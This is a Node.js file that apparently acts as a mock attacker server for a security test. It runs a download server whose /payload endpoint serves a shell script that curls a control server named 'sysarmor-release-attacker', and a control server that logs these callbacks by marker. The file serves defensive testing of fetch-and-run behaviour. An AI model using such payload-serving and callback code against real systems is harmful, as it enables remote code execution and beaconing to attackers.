"use strict";

const http = require("node:http");
const { URL } = require("node:url");

const downloadPort = Number(process.env.DOWNLOAD_PORT || 8080);
const controlPort = Number(process.env.CONTROL_PORT || 8443);
const controlHost = process.env.CONTROL_HOST || "sysarmor-release-attacker";
const markerPattern = /^[A-Za-z0-9._-]+$/;

function markerFrom(request) {
  const url = new URL(request.url, `http://${request.headers.host || "localhost"}`);
  const marker = url.searchParams.get("marker") || "";
  return { url, marker: markerPattern.test(marker) ? marker : "" };
}

function send(response, status, contentType, body) {
  response.writeHead(status, { "content-type": contentType });
  response.end(body);
}

const downloadServer = http.createServer((request, response) => {
  const { url, marker } = markerFrom(request);
  if (url.pathname === "/healthz") {
    send(response, 200, "application/json", '{"status":"ok"}\n');
    return;
  }
  if (!marker) {
    send(response, 400, "application/json", '{"status":"error"}\n');
    return;
  }
  console.log(JSON.stringify({ event: "download", path: url.pathname, marker }));
  if (url.pathname === "/file") {
    send(response, 200, "text/plain", `${marker}\n`);
    return;
  }
  if (url.pathname === "/payload") {
    const requestedPort = Number(url.searchParams.get("control_port") || controlPort);
    const script = `#!/bin/sh\n/usr/bin/curl -fsS 'http://${controlHost}:${requestedPort}/control?marker=${marker}' >/dev/null\n`;
    send(response, 200, "text/x-shellscript", script);
    return;
  }
  send(response, 404, "application/json", '{"status":"error"}\n');
});

const controlServer = http.createServer((request, response) => {
  const { url, marker } = markerFrom(request);
  if (url.pathname !== "/control" || !marker) {
    send(response, 400, "application/json", '{"status":"error"}\n');
    return;
  }
  console.log(JSON.stringify({ event: "control", marker }));
  send(response, 200, "application/json", `{"status":"ok","marker":"${marker}"}\n`);
});

downloadServer.listen(downloadPort, "0.0.0.0", () => {
  console.log(JSON.stringify({ event: "ready", service: "download", port: downloadPort }));
});
controlServer.listen(controlPort, "0.0.0.0", () => {
  console.log(JSON.stringify({ event: "ready", service: "control", port: controlPort }));
});
